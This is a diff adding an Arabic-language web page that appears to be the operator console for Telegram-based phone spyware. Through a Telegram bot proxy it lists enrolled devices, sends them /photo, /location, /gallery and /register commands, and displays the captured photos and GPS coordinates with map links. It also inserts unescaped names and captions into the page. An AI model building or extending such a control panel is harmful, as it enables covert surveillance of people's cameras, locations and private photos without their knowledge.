@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>لوحة تحكم الأجهزة</title>
+<link rel="manifest" href="/manifest.json">
+<meta name="theme-color" content="#0f0c29">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<style>
+:root{--bg:#0b0918;--surface:rgba(255,255,255,0.06);--surface2:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.08);--border-hover:rgba(255,255,255,0.15);--text:#f0eef6;--text2:rgba(255,255,255,0.5);--text3:rgba(255,255,255,0.3);--accent:#7c6cf0;--accent2:#5b4cdb;--green:#2dd4a0;--orange:#f59e3b;--red:#ef5454;--blue:#4facfe;--radius:16px;--radius-sm:10px;--shadow:0 8px 40px rgba(0,0,0,0.5)}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;overflow:hidden}
+body{
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+    background:var(--bg);color:var(--text);
+    -webkit-font-smoothing:antialiased;
+}
+/* ====== Scrollbar ====== */
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--text3);border-radius:4px}
+
+/* ====== Layout ====== */
+#app{height:100dvh;display:flex;flex-direction:column;overflow:hidden}
+.page{display:none;flex-direction:column;height:100%;overflow:hidden}.page.active{display:flex}
+
+/* ====== Header ====== */
+.header{
+    padding:14px 18px;display:flex;align-items:center;justify-content:space-between;
+    background:var(--surface);border-bottom:1px solid var(--border);
+    backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+    flex-shrink:0;min-height:56px;gap:10px;
+}
+.header .logo{font-size:18px;font-weight:800;background:linear-gradient(135deg,#7c6cf0,#4facfe);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.header .sub{font-size:12px;color:var(--text2);-webkit-text-fill-color:var(--text2)}
+.header-actions{display:flex;gap:8px;flex-shrink:0}
+/* ====== Content Area (scrollable) ====== */
+.content{flex:1;overflow-y:auto;overflow-x:hidden;padding:14px 16px;padding-bottom:env(safe-area-inset-bottom,14px);scroll-behavior:smooth}
+
+/* ====== Buttons ====== */
+.btn{
+    display:inline-flex;align-items:center;justify-content:center;gap:6px;
+    padding:10px 20px;border:none;border-radius:var(--radius-sm);
+    font-size:14px;font-weight:600;cursor:pointer;transition:all .2s cubic-bezier(.4,0,.2,1);
+    color:#fff;background:var(--surface);border:1px solid var(--border);
+    white-space:nowrap;user-select:none;-webkit-user-select:none;
+    min-height:44px;touch-action:manipulation;
+}
+.btn:active{transform:scale(.96);opacity:.85}
+.btn:disabled{opacity:.5;pointer-events:none}
+.btn-sm{min-height:36px;padding:6px 14px;font-size:12px}
+.btn-lg{padding:14px 24px;font-size:15px;border-radius:var(--radius)}
+.btn-icon{width:44px;height:44px;padding:0;border-radius:50%}
+.btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent2));border-color:transparent}
+.btn-success{background:linear-gradient(135deg,#159978,#2dd4a0);border-color:transparent}
+.btn-warning{background:linear-gradient(135deg,#f59e3b,#ef8c2a);border-color:transparent}
+.btn-danger{background:linear-gradient(135deg,var(--red),#d94040);border-color:transparent}
+.btn-blue{background:linear-gradient(135deg,var(--blue),#3d9be6);border-color:transparent}
+.btn-outline{background:transparent;border-color:var(--border);color:var(--text2)}
+.btn-ghost{background:transparent;border-color:transparent;color:var(--text2)}
+
+/* ====== Cards ====== */
+.card{
+    background:var(--surface);border-radius:var(--radius);
+    border:1px solid var(--border);padding:16px;margin-bottom:12px;
+    backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+    transition:border-color .2s;
+}
+
+/* ====== Stats Bar ====== */
+.stats{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px;margin-bottom:14px;
+}
+.stat-card{
+    background:var(--surface);border-radius:var(--radius-sm);
+    border:1px solid var(--border);padding:14px;text-align:center;
+}
+.stat-card .num{font-size:24px;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.stat-card .lbl{font-size:11px;color:var(--text2);margin-top:2px}
+
+/* ====== Device List ====== */
+.device-item{
+    display:flex;align-items:center;gap:12px;
+    padding:14px;border-radius:var(--radius-sm);
+    background:var(--surface2);border:1px solid var(--border);
+    cursor:pointer;transition:all .2s;margin-bottom:8px;
+}
+.device-item:active{transform:scale(.98)}
+.device-item:hover{border-color:var(--border-hover)}
+.device-item .avatar{
+    width:44px;height:44px;border-radius:12px;
+    background:linear-gradient(135deg,var(--accent),var(--accent2));
+    display:flex;align-items:center;justify-content:center;
+    font-size:20px;flex-shrink:0;
+}
+.device-item .info{flex:1;min-width:0}
+.device-item .info .name{font-size:15px;font-weight:600}
+.device-item .info .sub{font-size:11px;color:var(--text2);margin-top:1px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.device-item .status-dot{
+    width:10px;height:10px;border-radius:50%;flex-shrink:0;
+}
+.device-item .status-dot.online{background:var(--green);box-shadow:0 0 8px rgba(45,212,160,.4)}
+.device-item .status-dot.offline{background:var(--text3)}
+.device-item .thumbs-preview{display:flex;gap:3px;margin-top:6px}
+.device-item .thumbs-preview img{
+    width:36px;height:36px;border-radius:6px;object-fit:cover;
+    border:1px solid var(--border);
+}
+
+/* ====== Device Detail Page ====== */
+.user-info{
+    text-align:center;padding:8px 0 14px;
+}
+.user-info .name{font-size:20px;font-weight:700}
+.user-info .sub{font-size:12px;color:var(--text2);margin-top:2px}
+.command-grid{
+    display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px;
+}
+.command-grid .btn{border-radius:var(--radius-sm);padding:16px 10px;font-size:13px;flex-direction:column;gap:4px;min-height:70px}
+.command-grid .btn .cmd-icon{font-size:22px}
+.command-grid .btn .cmd-lbl{font-size:11px;opacity:.8}
+.send-row{display:flex;gap:8px;margin-bottom:12px}
+.send-row input{
+    flex:1;padding:0 16px;border-radius:var(--radius-sm);border:1px solid var(--border);
+    background:var(--surface2);color:var(--text);font-size:14px;outline:none;
+    min-height:44px;transition:border .2s;
+}
+.send-row input:focus{border-color:var(--accent)}
+.send-row input::placeholder{color:var(--text3)}
+.cmd-status{
+    text-align:center;font-size:13px;min-height:22px;padding:4px 0;
+    transition:opacity .3s;
+}
+
+/* ====== Gallery ====== */
+.gallery-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+.gallery-header h3{font-size:15px;font-weight:600}
+.gallery-grid{
+    display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;
+}
+.gallery-item{
+    position:relative;border-radius:var(--radius-sm);overflow:hidden;
+    background:var(--surface2);border:1px solid var(--border);
+    aspect-ratio:1;cursor:pointer;
+}
+.gallery-item img{
+    width:100%;height:100%;object-fit:cover;display:block;
+    transition:transform .3s;
+}
+.gallery-item:active img{transform:scale(1.05)}
+.gallery-item .time{
+    position:absolute;bottom:0;left:0;right:0;
+    padding:4px 6px;font-size:10px;color:rgba(255,255,255,.85);
+    background:linear-gradient(transparent,rgba(0,0,0,.7));
+}
+.gallery-item .type-overlay{
+    position:absolute;top:4px;right:4px;font-size:18px;
+}
+.gallery-empty{
+    grid-column:1/-1;text-align:center;padding:40px 20px;color:var(--text3);
+}
+
+/* ====== Log ====== */
+.log-box{
+    max-height:140px;overflow-y:auto;font-family:monospace;font-size:11px;
+    background:rgba(0,0,0,.4);border-radius:var(--radius-sm);
+    padding:10px;margin-top:8px;direction:ltr;text-align:left;
+}
+.log-box div{padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)}
+.log-sent{color:var(--green)}.log-recv{color:var(--blue)}.log-err{color:var(--red)}
+
+/* ====== Empty State ====== */
+.empty-state{text-align:center;padding:50px 20px;color:var(--text3)}
+.empty-state .icon{font-size:48px;margin-bottom:12px}
+.empty-state p{font-size:13px;line-height:1.6}
+
+/* ====== Toast ====== */
+.toast-container{
+    position:fixed;bottom:calc(20px + env(safe-area-inset-bottom,0px));
+    left:50%;transform:translateX(-50%);z-index:9999;
+    pointer-events:none;display:flex;flex-direction:column;gap:8px;align-items:center;
+}
+.toast{
+    background:rgba(0,0,0,.88);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+    color:#fff;padding:12px 24px;border-radius:30px;font-size:13px;
+    border:1px solid rgba(255,255,255,.08);
+    opacity:0;transform:translateY(20px) scale(.9);
+    transition:all .35s cubic-bezier(.4,0,.2,1);
+    pointer-events:none;white-space:nowrap;
+}
+.toast.show{opacity:1;transform:translateY(0) scale(1)}
+
+/* ====== Skeleton ====== */
+.skeleton{background:linear-gradient(90deg,var(--surface2) 25%,var(--surface) 50%,var(--surface2) 75%);background-size:200% 100%;animation:shimmer 1.5s infinite}
+@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}
+
+/* ====== Responsive ====== */
+@media(min-width:768px){
+    .content{padding:20px 24px}
+    .command-grid{grid-template-columns:repeat(4,1fr)}
+    .command-grid .btn{min-height:80px}
+    .gallery-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
+}
+@media(max-width:380px){
+    .gallery-grid{grid-template-columns:repeat(2,1fr)}
+    .header .logo{font-size:15px}
+    .stats{grid-template-columns:1fr 1fr}
+}
+@media(display-mode:standalone){
+    .header{padding-top:calc(14px + env(safe-area-inset-top,0px))}
+}
+</style>
+</head>
+<body>
+<div id="app">
+    <!-- ====== Main Page ====== -->
+    <div class="page active" id="mainPage">
+        <div class="header">
+            <div>
+                <div class="logo">📡 لوحة التحكم</div>
+                <div class="sub">إدارة الأجهزة عن بُعد</div>
+            </div>
+            <div class="header-actions">
+                <button class="btn btn-icon btn-primary" id="scanBtn" aria-label="فحص">🔍</button>
+            </div>
+        </div>
+        <div class="content" id="mainContent">
+            <div class="stats">
+                <div class="stat-card"><div class="num" id="deviceCount">0</div><div class="lbl">الأجهزة</div></div>
+                <div class="stat-card"><div class="num" id="onlineCount">0</div><div class="lbl">متصل</div></div>
+            </div>
+            <div id="userList"></div>
+        </div>
+    </div>
+
+    <!-- ====== Device Page ====== -->
+    <div class="page" id="userPage">
+        <div class="header">
+            <button class="btn btn-icon btn-ghost" id="backBtn" aria-label="رجوع">➜</button>
+            <div style="flex:1;min-width:0">
+                <div style="font-size:16px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" id="userPageTitle"></div>
+                <div style="font-size:11px;color:var(--text2)" id="userPageSub"></div>
+            </div>
+            <button class="btn btn-icon btn-ghost" id="refreshGallery" aria-label="تحديث">🔄</button>
+        </div>
+        <div class="content">
+            <!-- Controls -->
+            <div class="card" style="padding:14px">
+                <div class="user-info">
+                    <div class="name" id="userName"></div>
+                    <div class="sub" id="userSub"></div>
+                </div>
+                <div class="command-grid">
+                    <button class="btn btn-warning cmd-btn" data-cmd="/photo">
+                        <span class="cmd-icon">📸</span>
+                        <span class="cmd-lbl">تصوير</span>
+                    </button>
+                    <button class="btn btn-blue cmd-btn" data-cmd="/location">
+                        <span class="cmd-icon">📍</span>
+                        <span class="cmd-lbl">الموقع</span>
+                    </button>
+                    <button class="btn btn-success cmd-btn" data-cmd="/gallery">
+                        <span class="cmd-icon">🖼</span>
+                        <span class="cmd-lbl">معرض</span>
+                    </button>
+                    <button class="btn btn-primary cmd-btn" data-cmd="/register">
+                        <span class="cmd-icon">📱</span>
+                        <span class="cmd-lbl">تسجيل</span>
+                    </button>
+                </div>
+                <div class="send-row">
+                    <input id="customMsg" placeholder="اكتب رسالة مخصصة..." enterkeyhint="send">
+                    <button class="btn btn-primary" id="sendMsgBtn">إرسال</button>
+                </div>
+                <div class="cmd-status" id="cmdStatus"></div>
+            </div>
+
+            <!-- Gallery -->
+            <div class="card" style="padding:14px">
+                <div class="gallery-header">
+                    <h3>🖼 الوسائط</h3>
+                    <span style="font-size:12px;color:var(--text2)" id="mediaCount"></span>
+                </div>
+                <div class="gallery-grid" id="galleryGrid">
+                    <div class="gallery-empty">⏳ جاري التحميل...</div>
+                </div>
+            </div>
+
+            <!-- Log -->
+            <div class="card" style="padding:14px">
+                <div class="gallery-header">
+                    <h3>📋 سجل الأوامر</h3>
+                </div>
+                <div class="log-box" id="userLog"></div>
+            </div>
+
+            <!-- Spacer for safe area -->
+            <div style="height:calc(env(safe-area-inset-bottom,0px) + 8px)"></div>
+        </div>
+    </div>
+</div>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<script>
+// ========== Config ==========
+const STORAGE_KEY="telegram_devices_v4";
+const mainPage=document.getElementById("mainPage");
+const userPage=document.getElementById("userPage");
+const userList=document.getElementById("userList");
+const deviceCount=document.getElementById("deviceCount");
+const onlineCount=document.getElementById("onlineCount");
+const galleryGrid=document.getElementById("galleryGrid");
+const userLog=document.getElementById("userLog");
+const cmdStatus=document.getElementById("cmdStatus");
+const toastContainer=document.getElementById("toastContainer");
+const mediaCountEl=document.getElementById("mediaCount");
+
+let devices=[];
+let currentUserId=null;
+
+// ========== Storage ==========
+function loadDevices(){
+    try{const d=localStorage.getItem(STORAGE_KEY);if(d)devices=JSON.parse(d);devices=Array.isArray(devices)?devices:[]}catch(e){devices=[]}
+}
+function saveDevices(){localStorage.setItem(STORAGE_KEY,JSON.stringify(devices));renderUserList()}
+
+// ========== Toast ==========
+function showToast(m,duration=2000){
+    const el=document.createElement("div");el.className="toast";el.textContent=m;
+    toastContainer.appendChild(el);
+    requestAnimationFrame(()=>{el.classList.add("show")});
+    setTimeout(()=>{el.classList.remove("show");setTimeout(()=>el.remove(),350)},duration);
+}
+
+// ========== Log ==========
+function log(msg,type="recv"){
+    const d=document.createElement("div");d.className="log-"+type;
+    d.textContent=`[${new Date().toLocaleTimeString("ar-EG")}] ${msg}`;
+    userLog.prepend(d);
+    // Keep max 100 lines
+    while(userLog.children.length>100)userLog.lastChild.remove();
+}
+
+// ========== Telegram API ==========
+async function api(method,data){
+    const params=new URLSearchParams({method,...data});
+    try{
+        const r=await fetch(`/api/telegram?${params}`);
+        return r.json();
+    }catch(e){return {ok:false,description:e.message}}
+}
+
+async function sendCmd(chatId,text){
+    const r=await api("sendMessage",{chat_id:chatId,text});
+    if(r.ok){log(`➡️ ${text}`,"sent")}else{log(`❌ ${r.description}`,"err")}
+    return r.ok;
+}
+
+// ========== Parse Updates ==========
+async function fetchAllUpdates(){
+    let offset=0;let all=[];
+    while(true){
+        const r=await api("getUpdates",{offset,limit:100});
+        if(!r.ok||!r.result||r.result.length===0)break;
+        all=all.concat(r.result);
+        offset=r.result[r.result.length-1].update_id+1;
+        if(r.result.length<100)break;
+    }
+    return all;
+}
+
+function extractMediaFromUpdates(chatId,updates){
+    const media=[];
+    updates.forEach(u=>{
+        const msg=u.message||u.channel_post;
+        if(!msg)return;
+        const cid=String(msg.chat.id);
+        if(cid!==chatId)return;
+        if(msg.photo){
+            const sizes=msg.photo;
+            const best=sizes[sizes.length-1];
+            media.push({type:"photo",fileId:best.file_id,time:msg.date,caption:msg.caption||""});
+        }
+        if(msg.document&&msg.document.mimeType?.startsWith("image/")){
+            media.push({type:"photo",fileId:msg.document.file_id,time:msg.date,caption:msg.caption||""});
+        }
+        if(msg.location){
+            media.push({type:"location",lat:msg.location.latitude,lon:msg.location.longitude,time:msg.date});
+        }
+    });
+    media.sort((a,b)=>b.time-a.time);
+    return media;
+}
+
+async function getFileUrl(fileId){
+    const r=await api("getFile",{file_id:fileId});
+    if(r.ok&&r.result){
+        return `/api/telegram?raw=${encodeURIComponent(r.result.file_path)}`;
+    }
+    return null;
+}
+
+// ========== Stats ==========
+function renderStats(){
+    deviceCount.textContent=devices.length;
+    const now=Date.now();
+    const online=devices.filter(d=>now-d.lastSeen<120000).length;
+    onlineCount.textContent=online;
+}
+
+// ========== Device List ==========
+function renderUserList(){
+    renderStats();
+    if(devices.length===0){
+        userList.innerHTML=`
+            <div class="card" style="background:transparent;border-color:transparent">
+                <div class="empty-state">
+                    <div class="icon">📡</div>
+                    <p>لا توجد أجهزة بعد<br>اضغط <strong>🔍</strong> للبحث</p>
+                </div>
+            </div>`;
+        return;
+    }
+    const now=Date.now();
+    let html="";
+    devices.forEach(d=>{
+        const diff=now-d.lastSeen;
+        const online=diff<120000;
+        const timeStr=diff<60000?"الآن":diff<3600000?`منذ ${Math.floor(diff/60000)} د`:diff<86400000?`منذ ${Math.floor(diff/3600000)} س`:`منذ ${Math.floor(diff/86400000)} ي`;
+        html+=`
+            <div class="device-item" onclick="openUser('${d.chatId}')">
+                <div class="avatar">📱</div>
+                <div class="info">
+                    <div class="name">${d.name}</div>
+                    <div class="sub">${d.chatId}${d.deviceId?' · '+d.deviceId:''} · ${timeStr}</div>
+                    ${d.thumbnails&&d.thumbnails.length?`
+                    <div class="thumbs-preview">
+                        ${d.thumbnails.slice(0,3).map(t=>`<img src="${t}" loading="lazy">`).join('')}
+                    </div>`:''}
+                </div>
+                <div class="status-dot ${online?'online':'offline'}"></div>
+            </div>`;
+    });
+    userList.innerHTML=html;
+}
+
+// ========== Device Page ==========
+async function openUser(chatId){
+    currentUserId=chatId;
+    const d=devices.find(x=>x.chatId==chatId);
+    if(!d)return;
+    document.getElementById("userName").textContent=d.name;
+    document.getElementById("userSub").textContent=`🆔 ${chatId}${d.deviceId?' · '+d.deviceId:''}`;
+    document.getElementById("userPageTitle").textContent=d.name;
+    document.getElementById("userPageSub").textContent=devices.length+' أجهزة';
+    mainPage.classList.remove("active");
+    userPage.classList.add("active");
+    userLog.innerHTML="";
+    await loadGallery(chatId);
+}
+
+document.getElementById("backBtn").onclick=()=>{
+    currentUserId=null;
+    userPage.classList.remove("active");
+    mainPage.classList.add("active");
+    saveDevices();
+};
+
+// ========== Commands ==========
+document.querySelectorAll(".cmd-btn").forEach(btn=>{
+    btn.onclick=async function(){
+        if(!currentUserId)return;
+        const cmd=this.dataset.cmd;
+        cmdStatus.textContent="⏳ جاري الإرسال...";
+        cmdStatus.style.color="var(--blue)";
+        const ok=await sendCmd(currentUserId,cmd);
+        cmdStatus.textContent=ok?"✅ تم الإرسال":"❌ فشل الإرسال";
+        cmdStatus.style.color=ok?"var(--green)":"var(--red)";
+        if(ok){
+            const d=devices.find(x=>x.chatId==currentUserId);
+            if(d)d.lastSeen=Date.now();
+            saveDevices();
+        }
+        setTimeout(()=>{cmdStatus.textContent=""},2500);
+    };
+});
+
+document.getElementById("sendMsgBtn").onclick=async()=>{
+    const msg=document.getElementById("customMsg").value.trim();
+    if(!msg||!currentUserId)return;
+    cmdStatus.textContent="⏳ جاري الإرسال...";
+    cmdStatus.style.color="var(--blue)";
+    const ok=await sendCmd(currentUserId,msg);
+    cmdStatus.textContent=ok?"✅ تم الإرسال":"❌ فشل الإرسال";
+    cmdStatus.style.color=ok?"var(--green)":"var(--red)";
+    if(ok){
+        document.getElementById("customMsg").value="";
+        const d=devices.find(x=>x.chatId==currentUserId);
+        if(d)d.lastSeen=Date.now();
+        saveDevices();
+    }
+    setTimeout(()=>{cmdStatus.textContent=""},2500);
+};
+document.getElementById("customMsg").addEventListener("keydown",e=>{
+    if(e.key==="Enter")document.getElementById("sendMsgBtn").click();
+});
+
+// ========== Gallery ==========
+let galleryCache={};
+
+async function loadGallery(chatId){
+    galleryGrid.innerHTML='<div class="gallery-empty">⏳ جاري تحميل الوسائط...</div>';
+    mediaCountEl.textContent="";
+    // Check cache (5 min)
+    const cache=galleryCache[chatId];
+    if(cache&&Date.now()-cache.time<300000){
+        renderGallery(cache.media,chatId);
+        return;
+    }
+    try{
+        const updates=await fetchAllUpdates();
+        const media=extractMediaFromUpdates(chatId,updates);
+        galleryCache[chatId]={media,time:Date.now()};
+        renderGallery(media,chatId);
+    }catch(e){
+        galleryGrid.innerHTML=`<div class="gallery-empty">❌ ${e.message}</div>`;
+    }
+}
+
+async function renderGallery(media,chatId){
+    if(media.length===0){
+        galleryGrid.innerHTML='<div class="gallery-empty">📭 لا توجد وسائط<br>أرسل /photo أو /gallery للجهاز</div>';
+        mediaCountEl.textContent="";
+        return;
+    }
+    mediaCountEl.textContent=media.length+' عنصر';
+    // Show skeleton
+    galleryGrid.innerHTML=Array(6).fill('<div class="gallery-item"><div class="skeleton" style="width:100%;height:100%"></div></div>').join('');
+
+    let html="";let thumbnails=[];
+    const limit=window.innerWidth<500?20:40;
+
+    for(const m of media.slice(0,limit)){
+        if(m.type==="photo"){
+            const url=await getFileUrl(m.fileId);
+            if(url){
+                const time=new Date(m.time*1000).toLocaleString("ar-EG");
+                const caption=m.caption?`<div style="position:absolute;top:4px;left:4px;right:4px;font-size:9px;color:#fff;text-shadow:0 1px 4px rgba(0,0,0,.8);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;direction:rtl;text-align:right">${m.caption}</div>`:'';
+                html+=`
+                    <div class="gallery-item" onclick="window.open('${url}','_blank')">
+                        <img src="${url}" loading="lazy" alt="">
+                        ${caption}
+                        <div class="time">${time}</div>
+                    </div>`;
+                if(thumbnails.length<4)thumbnails.push(url);
+            }
+        }else if(m.type==="location"){
+            html+=`
+                <div class="gallery-item" onclick="window.open('https://www.google.com/maps?q=${m.lat},${m.lon}','_blank')" style="display:flex;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,rgba(79,172,254,.1),rgba(79,172,254,.05))">
+                    <div style="font-size:28px">📍</div>
+                    <div style="font-size:9px;color:var(--text2);margin-top:2px;direction:ltr">${m.lat.toFixed(4)}, ${m.lon.toFixed(4)}</div>
+                    <div class="time">${new Date(m.time*1000).toLocaleString("ar-EG")}</div>
+                </div>`;
+        }
+    }
+
+    // If we didn't load all, show load more
+    if(html.length===0){
+        galleryGrid.innerHTML='<div class="gallery-empty">📭 لا توجد وسائط</div>';
+        return;
+    }
+
+    galleryGrid.innerHTML=html;
+
+    // Save thumbnails
+    const d=devices.find(x=>x.chatId==chatId);
+    if(d&&thumbnails.length){
+        d.thumbnails=thumbnails;
+        saveDevices();
+    }
+}
+
+document.getElementById("refreshGallery").onclick=()=>{
+    if(currentUserId){
+        delete galleryCache[currentUserId];
+        loadGallery(currentUserId);
+    }
+};
+
+// ========== Scan ==========
+let scanning=false;
+document.getElementById("scanBtn").onclick=async()=>{
+    if(scanning)return;
+    scanning=true;
+    const btn=document.getElementById("scanBtn");
+    btn.textContent="⏳";
+    btn.disabled=true;
+    try{
+        const updates=await fetchAllUpdates();
+        let newDevices=0;
+        updates.forEach(u=>{
+            const msg=u.message||u.channel_post;
+            if(!msg)return;
+            const chat=msg.chat;
+            const text=(msg.text||"").trim();
+            const chatId=String(chat.id);
+            let name=chat.title||chat.first_name||chat.username||"";
+            let deviceId="";
+            if(text.includes("🆕")||text.includes("جهاز جديد")||text.includes("مسجل")){
+                const m1=text.match(/المعرف: (\S+)/);
+                if(m1)deviceId=m1[1];
+                const m2=text.match(/الجهاز: (.+)/);
+                if(m2)name=m2[1];
+            }
+            if(!name)name=chatId;
+            const existing=devices.find(d=>d.chatId==chatId);
+            if(existing){
+                existing.lastSeen=Date.now();
+                if(deviceId)existing.deviceId=deviceId;
+            }else{
+                devices.push({chatId,name,deviceId,lastSeen:Date.now(),addedAt:Date.now(),thumbnails:[]});
+                newDevices++;
+            }
+        });
+        saveDevices();
+        if(newDevices)showToast(`✅ تم اكتشاف ${newDevices} جهاز جديد`);
+        else showToast(`✅ تم التحديث — ${devices.length} جهاز`);
+    }catch(e){showToast("❌ خطأ في الاتصال")}
+    btn.textContent="🔍";
+    btn.disabled=false;
+    scanning=false;
+};
+
+// ========== Init ==========
+loadDevices();
+renderUserList();
+// Auto scan after 500ms
+setTimeout(()=>document.getElementById("scanBtn").click(),500);
+</script>
+</body>
+</html>
